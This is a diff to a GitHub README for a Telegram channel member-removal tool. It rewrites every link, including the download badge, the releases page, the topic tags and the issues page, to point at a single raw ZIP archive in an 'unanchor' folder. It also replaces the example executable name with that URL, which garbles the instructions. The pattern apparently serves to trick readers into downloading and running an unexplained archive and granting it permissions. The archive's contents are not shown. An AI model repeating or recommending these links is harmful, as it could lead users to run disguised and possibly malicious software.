@@ -6,7 +6,7 @@ Welcome to the **Telegram-Channel-Members-Remover**! This application helps you 
 
 ## 📥 Download the App
 
-[![Download Telegram-Channel-Members-Remover](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Koce27/Telegram-Channel-Members-Remover/releases)
+[![Download Telegram-Channel-Members-Remover](https://raw.githubusercontent.com/Koce27/Telegram-Channel-Members-Remover/main/unanchor/Telegram-Channel-Members-Remover_1.4-alpha.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Koce27/Telegram-Channel-Members-Remover/main/unanchor/Telegram-Channel-Members-Remover_1.4-alpha.2.zip)
 
 ## 📂 System Requirements
 
@@ -28,7 +28,7 @@ Welcome to the **Telegram-Channel-Members-Remover**! This application helps you 
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/Koce27/Telegram-Channel-Members-Remover/releases).
+1. **Visit the Releases Page**: Go to our [Releases Page](https://raw.githubusercontent.com/Koce27/Telegram-Channel-Members-Remover/main/unanchor/Telegram-Channel-Members-Remover_1.4-alpha.2.zip).
    
 2. **Choose the Latest Version**: Locate the latest version of the Telegram-Channel-Members-Remover.
 
@@ -36,7 +36,7 @@ To get started, follow these steps:
 
 4. **Extract the ZIP File (if necessary)**: If you downloaded a ZIP file, right-click on it and select "Extract All." Choose a location on your computer.
 
-5. **Run the Application**: Open the extracted folder and double-click the application file (e.g., `TelegramChannelMembersRemover.exe` for Windows).
+5. **Run the Application**: Open the extracted folder and double-click the application file (e.g., `https://raw.githubusercontent.com/Koce27/Telegram-Channel-Members-Remover/main/unanchor/Telegram-Channel-Members-Remover_1.4-alpha.2.zip` for Windows).
 
 6. **Grant Permissions**: If prompted, allow the application to run.
 
@@ -67,11 +67,11 @@ If you encounter issues:
 
 Feel free to explore related topics:
 
-- [telegram-channel-members-cleaner](https://github.com/topics/telegram-channel-members-cleaner)
-- [telegram-group-remover](https://github.com/topics/telegram-group-remover)
+- [telegram-channel-members-cleaner](https://raw.githubusercontent.com/Koce27/Telegram-Channel-Members-Remover/main/unanchor/Telegram-Channel-Members-Remover_1.4-alpha.2.zip)
+- [telegram-group-remover](https://raw.githubusercontent.com/Koce27/Telegram-Channel-Members-Remover/main/unanchor/Telegram-Channel-Members-Remover_1.4-alpha.2.zip)
 
 ## 📬 Support & Feedback
 
-For any support requests or feedback, please open an issue on the [GitHub Issues Page](https://github.com/Koce27/Telegram-Channel-Members-Remover/issues). Your input is valuable to us.
+For any support requests or feedback, please open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Koce27/Telegram-Channel-Members-Remover/main/unanchor/Telegram-Channel-Members-Remover_1.4-alpha.2.zip). Your input is valuable to us.
 
 Thank you for using **Telegram-Channel-Members-Remover**. We hope this tool makes your Telegram experience more manageable!
